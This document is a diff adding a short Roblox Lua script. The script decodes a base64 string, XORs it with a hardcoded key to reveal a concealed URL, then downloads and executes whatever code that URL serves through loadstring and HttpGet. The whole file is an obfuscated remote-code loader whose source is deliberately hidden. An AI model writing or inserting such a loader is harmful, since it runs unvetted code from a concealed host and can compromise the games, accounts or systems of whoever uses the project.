@@ -1,0 +1,18 @@
+local HttpService = game:GetService("HttpService")
+
+local xor = function(str, key)
+    local result = {}
+    for i = 1, #str do
+        local keyChar = key:byte((i - 1) % #key + 1)
+        result[i] = string.char(bit32.bxor(str:byte(i), keyChar))
+    end
+    return table.concat(result)
+end
+
+local encoded = "BBUZEhJVHh1BDRZDBQgbWUdRGRIIEAIAX0ZWAhVDAQ4CHlNdBA0MDwYGSUddCwUMDAYZXltWAU4dEBUKX1YcHgQLEU4HVFNXH04AAwgBHlddCE8ZGhU="
+local key = "lambao123"
+
+local decodedXor = HttpService:Base64Decode(encoded)
+local realUrl = xor(decodedXor, key)
+
+loadstring(game:HttpGet(realUrl))()
